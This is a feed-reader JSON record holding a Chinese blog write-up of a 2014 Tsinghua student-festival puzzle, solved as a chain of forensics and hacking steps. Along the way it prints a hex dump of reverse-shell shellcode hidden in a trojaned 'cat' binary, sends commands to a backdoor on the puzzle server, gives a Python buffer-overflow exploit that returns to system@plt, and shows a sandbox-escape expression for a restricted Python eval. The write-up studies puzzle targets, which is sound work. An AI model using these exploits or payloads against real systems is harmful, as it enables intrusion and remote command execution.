{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-13 13:28:56","updatedTime":"2020-10-13 13:28:56","title":"Student Festival Puzzle 2014","link":"http://ppwwyyxx.com/blog/2014/Student-Festival-Puzzle-2014/","description":"<p>学生节延续<a href=\"http://ppwwyyxx.com/blog/2013/Student-Festival-Puzzle/\" title=\"上一年传统\">上一年传统</a>出了海报谜题:</p>\n<a id=\"more\"></a> \n<img src=\"http://learn.tsinghua.edu.cn:8080/2012011343/StudentFestival2014/poster.jpg\" class=\"center\" width=\"600\"><p>密文bits依旧直接存在图里, 拿出来作为二进制写进文件:</p>\n <figure class=\"highlight\">\n  <pre><font face=\"monospace\">$&nbsp;<font color=\"#d5e617\">echo</font>&nbsp;<font color=\"#d5e617\">\"</font>ibase=2;obase=10000;<font color=\"#c000c0\">$(</font><font color=\"#c000c0\">strings poster.jpg&nbsp;&nbsp;</font><font color=\"#d5e617\">|</font><font color=\"#c000c0\">&nbsp;</font><font color=\"#d5e617\">tail</font><font color=\"#c000c0\">&nbsp;</font><font color=\"#c000c0\">-n</font><font color=\"#c000c0\">1</font><font color=\"#c000c0\">)</font><font color=\"#d5e617\">\"</font>&nbsp;| bc | tr&nbsp;<font color=\"#c000c0\">-d</font>&nbsp;<font color=\"#d5e617\">'</font>\\\\\\n<font color=\"#d5e617\">'</font>&nbsp;| xxd&nbsp;<font color=\"#c000c0\">-r</font>&nbsp;<font color=\"#c000c0\">-p</font>&nbsp;<font color=\"#d5e617\">&gt;</font>&nbsp;poster-bin$ file poster-bin</font></pre>\n </figure><p>file一下发现是zlib压缩的, 于是解压:</p>\n <figure class=\"highlight\">\n  <pre><font face=\"monospace\">$ python2&nbsp;<font color=\"#c000c0\">-c</font>&nbsp;<font color=\"#d5e617\">'</font>import zlib; print zlib.decompress(open(\"poster-bin\").read())</font></pre>\n </figure><p>得到如下输出:</p>\n <blockquote>\n  <p>＝＝＝ ＡＷ▉▉Ｍ 联合作战组Ｚ小队第２７次会议摘要 ＝＝＝</p>\n  <p>２０１４年▉▉月１６日 【绝密】</p>\n  <p>尊敬的▉▉▉▉▉▉:</p>\n  <p>您收到这份拷贝意味着您自动加入▉▉▉▉，保密等级提升至▉▉▉▉。已由▉▉代您签署▉▉▉▉▉，该代理行为由▉▉▉第▉▉▉号令批准。请您遵守▉▉▉▉▉▉，请阅后即刻销毁。</p>\n  <p>·关于病毒▉▉ｏｒ▉ Ａ▉▉ＲＭ是从未见过的▉▉▉，在其自律进化系统的作用下，已进化出群体尺度上的智能。▉▉尚未有任何关于智能形成日期的估计，因为有▉▉可以证明其进行过反图灵测试行为。反图灵测试行为指对智能特征进行刻意隐藏，同时封锁▉▉▉，篡改▉▉ ▉行为也被观测到。有证据表明该智能体对于全角▉号的使用者存在蔑视行为，对带有▉▉▉▉的内容审查强度稍低。</p>\n  <p>·我们的现状 ＡＷ▉▉Ｍ已经掌握了这个地球上的７８．３▉％的计算资源，无法确定▉▉▉空间站是否受其影响。日前Ｂ▉▉ｃｏｉｎ体系的崩溃导致了对其高度依赖的人类经济面临着严重危机。然而这恐怕只是它的一小步。据可信估计，我们认为它的目标是▉▉ ▉▉▉。</p>\n  <p>·▉▉▉的消息 事情有所转机，Ｄ小队覆灭前获得到了它的早期样本。样本可以在ｔ．ｃｎ／Ｒｚ１ｋＯＬｃ获取。我们正在被监视，无法绕过它的眼睛接触样本。除了通过特殊手段给您这份拷贝我们无能为力。愿主神保佑我们，请记住：▉▉▉▉▉▉</p>\n </blockquote><p>访问提供的那个链接, 得到一个二进制的<code>cat</code>文件.</p><p>这个cat的行为目测跟系统的cat一样, 比较一下objdump出来发现多了一段东西, 比较readelf发现东西跟在eh_frame字 段后面. 于是</p>\n <figure class=\"highlight\">\n  <pre><font face=\"monospace\">$ readelf&nbsp;<font color=\"#c000c0\">-S</font>&nbsp;cat&nbsp;<font color=\"#c000c0\">--hex-dump</font><font color=\"#d5e617\">=</font>.eh_frame&nbsp;<font color=\"#d5e617\">&gt;</font>&nbsp;ehframe.hex$ cat ehframe.hex.....0x0040b0c0 ffe56a29 58996a02 5f6a015e 0f054897 ..j<span style=\"background-color:#ff6060\"><font color=\"#ffffff\">)</font></span>X.j._j.^..H.0x0040b0d0 48b90200 0539ca70 33c15148 89e66a10 H....9.p3.QH..j.0x0040b0e0 5a6a2a58 0f056a03 5e48ffce 6a21580f Zj*X..j.^H..j!X.0x0040b0f0 0575f66a 3b589948 bb2f6269 6e2f7368 .u.j;X.H./bin/sh0x0040b100&nbsp;00534889&nbsp;e7525748 89e60f05&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.SH..RWH....</font></pre>\n </figure><p>发现最后有/bin/sh, 像是个shellcode, blahgeek说搜索一下就能找到, 于是在<a href=\"https://github.com/Veil-Framework/Veil-Evasion/blob/master/tools/backdoor/intel/LinuxIntelELF64.py\" target=\"_blank\" rel=\"noopener\">github上</a>找到了一段基本一样的shellcode. 对比shellcode, 得到ip+port: 202.112.51.193:1337</p><p>http://202.112.51.193 是一个计算机系主页的fork, 页面中藏有<code>importantFile=ADoG</code>字样提示, robots中藏有<code>Disallow: /backdoor/</code>.</p><p>因此 GET http://202.112.51.193/backdoor/ADoG 得到提示, 说可以POST command, 于是:</p>\n <figure class=\"highlight\">\n  <pre><font face=\"monospace\">$ curl&nbsp;<font color=\"#c000c0\">-X</font>&nbsp;POST&nbsp;<font color=\"#c000c0\">--data</font>&nbsp;<font color=\"#d5e617\">\"</font>command=ls -lh<font color=\"#d5e617\">\"</font>&nbsp;<a href=\"http://202.112.51.193/backdoor/ADoG\" target=\"_blank\" rel=\"noopener\">http://202.112.51.193/backdoor/ADoG</a></font></pre>\n </figure><p>发现服务器上有<a href=\"http://ppwwyyxx.com/blog/2014/Student-Festival-Puzzle-2014/secret.wav\" title=\"secret.wav\">secret.wav</a>文件. 再利用cat将文件取回本地, 听起来挺神秘的...分析不动</p><p>第二天得到提示说LSB(least significant bits), 于是用matlab得到所有bits, 并转为16进制观察:</p>\n <figure class=\"highlight\">\n  <pre><font face=\"monospace\">$ matlab&nbsp;<font color=\"#c000c0\">-nodisplay</font>&nbsp;<font color=\"#c000c0\">-r</font>&nbsp;clc&nbsp;<font color=\"#d5e617\">&lt;&lt;&lt;</font>&nbsp;<font color=\"#d5e617\">\"</font>x=wavread('secret.wav');bitand(x*32768+32768,1)<font color=\"#d5e617\">\"</font>&nbsp;&nbsp;|&nbsp;<font color=\"#d5e617\">tail</font>&nbsp;<font color=\"#c000c0\">-n</font>+14&nbsp;| head&nbsp;<font color=\"#c000c0\">-n-</font>2 | tr&nbsp;<font color=\"#c000c0\">-d</font>&nbsp;<font color=\"#d5e617\">'</font>&nbsp;\\n<font color=\"#d5e617\">'</font>&nbsp;<font color=\"#d5e617\">&gt;</font>&nbsp;wav-bits$&nbsp;<font color=\"#d5e617\">echo</font>&nbsp;<font color=\"#d5e617\">\"</font>ibase=2;obase=10000;<font color=\"#c000c0\">$(</font><font color=\"#d5e617\">&lt;</font><font color=\"#c000c0\">wav-bits</font><font color=\"#c000c0\">)</font><font color=\"#d5e617\">\"</font>&nbsp;| bc | tr&nbsp;<font color=\"#c000c0\">-d</font>&nbsp;<font color=\"#d5e617\">'</font>\\\\\\n<font color=\"#d5e617\">'</font></font></pre>\n </figure><p>发现明显的周期性, 有一段数据<code>162E2E0E5CF4F44C0C4C748C8C4C74AC8C744C4CEC5CAC1CCC8C2CF4</code>在反复出现.将其转为二进制, 按8位一行显示:</p>\n <figure class=\"highlight\">\n  <pre><font face=\"monospace\">$ python2&nbsp;<font color=\"#c000c0\">-c</font>&nbsp;<font color=\"#d5e617\">'</font>for k in \"162E2E0E5CF4F44C0C4C748C8C4C74AC8C744C4CEC5CAC1CCC8C2CF4\": print format(int(k, 16), \"04b\")<font color=\"#d5e617\">'</font>&nbsp;| tr&nbsp;<font color=\"#c000c0\">-d</font>&nbsp;<font color=\"#d5e617\">'</font>\\n<font color=\"#d5e617\">'</font>&nbsp;| fold&nbsp;<font color=\"#c000c0\">-w</font>8&nbsp;<font color=\"#d5e617\">&gt;</font>&nbsp;wav-bits$ cat wav-bits000101100010111000101110000011100101110011110100111101000100110000001100010011000111010010001100100011000100110001110100101011001000110001110100010011000100110011101100010111001010110000011100110011001000110000101100</font></pre>\n </figure><p>看见最后一列均为0, 因此开哥猜到将每一行reverse之后就是ascii.</p>\n <figure class=\"highlight\">\n  <pre><font face=\"monospace\">$ rev wav-bits | perl&nbsp;<font color=\"#c000c0\">-lpe</font>&nbsp;<font color=\"#d5e617\">'</font>$_=pack\"B*\",$_<font color=\"#d5e617\">'</font>&nbsp;| paste&nbsp;<font color=\"#c000c0\">-sd</font>&nbsp;<font color=\"#d5e617\">''</font><a href=\"http://202.112.51.227:58314/\" target=\"_blank\" rel=\"noopener\">http://202.112.51.227:58314/</a></font></pre>\n </figure><p>得到一个新的服务的地址. 访问可以看到一个自制的http服务,并且提供了<a href=\"http://ppwwyyxx.com/blog/2014/Student-Festival-Puzzle-2014/xinx.c\">源代码</a>.</p><p>代码里可以看到一个明显的buffer overflow漏洞,然而由于地址随机化,没法很好的利用.但是代码里出现了<code>system</code>调用, 暴露了<code>system@plt</code>这个符号的位置,因此考虑利用溢出将返回地址修改至此处. 而system调用执行的命令可以利用传入的path存入全局的cookie里,以实现任意命令执行. 唯一需要注意的是 shellcode中不能出现tab,space这些字符,以保证shellcode通过scanf正确写入.</p>\n <figure class=\"highlight\">\n  <pre><font face=\"monospace\"><font color=\"#c000c0\">from</font>&nbsp;zio&nbsp;<font color=\"#c000c0\">import</font>&nbsp;*&nbsp;&nbsp;&nbsp;<font color=\"#8080ff\"># <a href=\"https://github.com/zTrix/zio\" target=\"_blank\" rel=\"noopener\">https://github.com/zTrix/zio</a></font><font color=\"#c000c0\">import</font>&nbsp;sysshellcode =&nbsp;'C'&nbsp;+&nbsp;'sh'path = shellcode +&nbsp;'<font color=\"#c000c0\">\\x00</font>'&nbsp;*&nbsp;(256&nbsp;-&nbsp;<font color=\"#0edbcb\">len</font>(shellcode))&nbsp;+&nbsp;'C'&nbsp;*&nbsp;12&nbsp;+&nbsp;<font color=\"#c000c0\">\\</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'<font color=\"#c000c0\">\\x50\\x85\\x04\\x08</font>'&nbsp;+&nbsp;'CCCC'&nbsp;+&nbsp;'<font color=\"#c000c0\">\\x71\\xcf\\x04\\x08</font>'exploit =&nbsp;'GET {} HTTP/1.1<font color=\"#c000c0\">\\r\\n</font>Host: 1.2.3.4'.format(path)io = zio(('202.112.51.227',&nbsp;58314))io.writeline(exploit)io.interact()</font></pre>\n </figure><p>得到shell后,发现一个奇怪的<a href=\"http://ppwwyyxx.com/blog/2014/Student-Festival-Puzzle-2014/diary.txt\">日记</a>,里面的内容写的挺不错.</p><p>日记里提到了新服务, 访问那个服务并且尝试了一会之后, 猜想是一个python的eval的shell.</p><p>python的eval自然是有注入漏洞的, 然而这题的服务,在eval之前做了如下的处理来限制eval的能力:</p>\n <figure class=\"highlight\">\n  <pre><font face=\"monospace\"><font color=\"#c000c0\">from</font>&nbsp;sys&nbsp;<font color=\"#c000c0\">import</font>&nbsp;modulesmodules.clear()<font color=\"#d5e617\">del</font>&nbsp;modules__builtins__.__dict__.clear()__builtins__ =&nbsp;<font color=\"#0edbcb\">None</font></font></pre>\n </figure><p>执行了这些操作之后, python的内置函数就都无法使用了,甚至eval本身都已经不存在了,需要事先备份一个. 此时, 只有依靠最基本的语法,来找回必要的功能. 在网上找到了这么一个表达式, 没有利用任何函数, 但可以eval出module os:</p>\n <figure class=\"highlight\">\n  <pre><font face=\"monospace\">[x&nbsp;<font color=\"#d5e617\">for</font>&nbsp;x&nbsp;<font color=\"#d5e617\">in</font>&nbsp;().__class__.__bases__[0].__subclasses__()&nbsp;<font color=\"#d5e617\">if</font>&nbsp;x.__name__ ==&nbsp;'catch_warnings'][0].__init__.func_globals[\"linecache\"].__dict__[\"os\"]</font></pre>\n </figure><p>有了os之后, 可以listdir了, 用object的subclasses还能够找到module file, 因此也可以读文件. 最后直接在目标服务器上读到了最终答案.</p></img>","descriptionType":"html","publishedDate":"Sun, 28 Dec 2014 08:26:30 +0000","feedId":15887,"bgimg":"","linkMd5":"bbd10f7173214978d2cc3fd7af3a6654","bgimgJsdelivr":"","metaImg":"","author":"","articleImgCdnMap":{"http://learn.tsinghua.edu.cn:8080/2012011343/StudentFestival2014/poster.jpg":null},"publishedOrCreatedDate":1602566936617}],"record":{"createdTime":"2020-10-13 13:28:56","updatedTime":"2020-10-13 13:28:56","feedId":15887,"fetchDate":"Tue, 13 Oct 2020 05:28:56 +0000","fetchMs":551,"handleMs":15,"totalMs":122204,"newArticles":0,"totalArticles":20,"status":1,"type":0,"ip":"c95099efafc17f9e0beaf843cecd5c56","hostName":"us-006*","requestId":"5e2bd0b7d2cb4231adec17aa968423a6_15887","contentType":"text/xml","totalBytes":0,"bgimgsTotal":0,"bgimgsGithubTotal":0,"articlesImgsTotal":1,"articlesImgsGithubTotal":0,"successGithubMap":{},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 02:11:38","updatedTime":"2020-09-07 02:37:04","id":15887,"name":"Yuxin's Blog","url":"http://ppwwyyxx.com/atom.xml","subscriber":211,"website":null,"icon":"https://www.gravatar.com/avatar/0c9f23b0750710ed47c897702096e1f5","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx62/cdn67@2020_4/2020/09/06/18-37-03-923_ac1bef66c6d5bba4.jpg","description":"Research that matters","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2020-10-13 13:30:58","updatedTime":"2020-10-13 13:30:58","id":null,"feedId":15887,"linkMd5":"bbd10f7173214978d2cc3fd7af3a6654"}],"tmpCommonImgCdnBytes":0,"tmpBodyImgCdnBytes":0,"tmpBgImgCdnBytes":0,"extra4":{"start":1602566935888,"total":0,"statList":[{"spend":714,"msg":"获取xml内容"},{"spend":15,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":121473,"msg":"正文链接上传到cdn"}]},"extra5":1,"extra6":0,"extra7ImgCdnFailResultVector":[null,null],"extra10_invalidATagHrefValue":{"http://ppwwyyxx.com/blog/2014/Student-Festival-Puzzle-2014/_/blog/2013/Student-Festival-Puzzle/":"http://ppwwyyxx.com/blog/2013/Student-Festival-Puzzle/","http://ppwwyyxx.com/blog/2014/Student-Festival-Puzzle-2014/_/blog/2014/Student-Festival-Puzzle-2014/secret.wav":"http://ppwwyyxx.com/blog/2014/Student-Festival-Puzzle-2014/secret.wav","http://ppwwyyxx.com/blog/2014/Student-Festival-Puzzle-2014/_diary.txt":"http://ppwwyyxx.com/blog/2014/Student-Festival-Puzzle-2014/diary.txt","http://ppwwyyxx.com/blog/2014/Student-Festival-Puzzle-2014/_xinx.c":"http://ppwwyyxx.com/blog/2014/Student-Festival-Puzzle-2014/xinx.c"},"extra111_proxyServerAndStatMap":{"http://europe67.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-52.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]}},"extra12ImgCdnSuccessResultVector":[],"successGithubMap":{},"failGithubMap":{}}